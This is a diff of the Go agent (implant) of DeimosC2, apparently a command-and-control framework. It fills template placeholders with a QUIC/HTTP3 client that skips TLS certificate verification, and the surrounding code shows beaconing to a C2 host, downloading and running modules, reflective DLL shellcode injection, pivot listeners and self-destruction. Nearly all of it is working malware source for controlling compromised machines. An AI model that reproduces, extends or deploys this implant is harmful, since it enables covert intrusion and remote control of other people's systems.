@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"crypto/rand"
+	"crypto/tls"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
@@ -17,8 +18,7 @@ import (
 	"runtime"
 	"strconv"
 	mrand "math/rand"
-	{{HIDDEN_CRYPT}}
-	{{HIDDEN_ESNI_IMPORT}}
+
 	"github.com/DeimosC2/DeimosC2/agents/resources/agentfunctions"
 	"github.com/DeimosC2/DeimosC2/agents/resources/selfdestruction"
 	"github.com/DeimosC2/DeimosC2/agents/resources/shellinject"
@@ -26,9 +26,13 @@ import (
 	"github.com/DeimosC2/DeimosC2/lib/crypto"
 	"github.com/DeimosC2/DeimosC2/lib/logging"
 	"github.com/DeimosC2/DeimosC2/lib/modulescommon"
+
+	"github.com/lucas-clemente/quic-go/http3"
+
 )
 
 var rpcUp = false    //Check this to know if the RPC server was spun up or not
+var qClient http.Client
 var pList agentfunctions.PivotList //Holds the pivot listener
 var key string      //Key of the agent
 var host = "{{HOST}}"               //Host of the listener
@@ -44,15 +48,19 @@ var checkin = "/{{CHECKIN}}"
 var moduleloc = "/{{MODULELOC}}"
 var pivotloc = "/{{PIVOTLOC}}"
 var modPort int
-{{HIDDEN_FRONTDOMAIN}}
-{{HIDDEN_ACTDOMAIN}}
-{{HIDDEN_HTTPCLIENT}}
 
 //ModData is used for RPC
 type ModData int
 
 func main() {
-	{{HIDDEN_CODE_BLOCK_MAIN}}
+	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+	pubKey = []byte(stringPubKey)
+
+	qClient = http.Client{
+		Transport: &http3.RoundTripper{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	  }
 
 	for {
 		agentfunctions.CheckTime(liveHours)
@@ -76,6 +84,11 @@ func connect(connType string, data string) {
 		key = string(sendMsg(firsttime, msg))
 	case "check_in":
 		checkIn()
+	default:
+		//temp debugging
+		//logging.Logger.Println("default called")
+		// message := []byte("encrypted and decrypted message")
+		// sendMsg(conn, message, []byte("0"))
 	}
 }
 
@@ -96,7 +109,9 @@ func sendMsg(msgType string, data []byte) []byte {
 	encMsg := crypto.Encrypt(data, aesKey)
 	final := append(encPub, encMsg...)
 	fullMessage = final
-	r, err := http.Post(("https://" + {{HIDDEN_HOST}} + ":" + port + msgType), "application/json", bytes.NewBuffer(fullMessage))
+
+
+	r, err := qClient.Post(("https://" + host + ":" + port + msgType), "application/json", bytes.NewBuffer(fullMessage))
 	if err != nil {
 		agentfunctions.ErrHandling(err.Error())
 	}
@@ -176,6 +191,7 @@ func jobExecute(j []agentfunctions.AgentJob) {
 				pList.ListChan = make(chan bool)
 				go agentfunctions.KillNetList(pList.Listener, &pList)
 				resp = "Pivot Listener Successfully Stood Up"
+				
 			}
 			agentfunctions.AllOutput.Mutex.Lock()
 			agentfunctions.JobCount++
@@ -266,10 +282,10 @@ func execMod(moduleName string, execType string, moduleData string) {
 		//Once it's downloaded then execute
 		if fullFileName != "" {
 			cmd := exec.Command(fullFileName, strconv.Itoa(modPort))
+			//logging.Logger.Println(cmd)
 			cmd.Start()
 		}
 	case "inject":
-		
 		sc := hex.EncodeToString([]byte(binary))
 		//Inject the reflective dll into the process
 		shellinject.ShellInject(sc, "")
@@ -437,7 +453,6 @@ func handleConnection(conn net.Conn, pr []byte) {
 		agentfunctions.ErrHandling("How did you get here?")
 		return
 	}
-
 }
 
 func listenerRecvMsg(conn net.Conn, pr []byte) (string, string, string, []byte) {
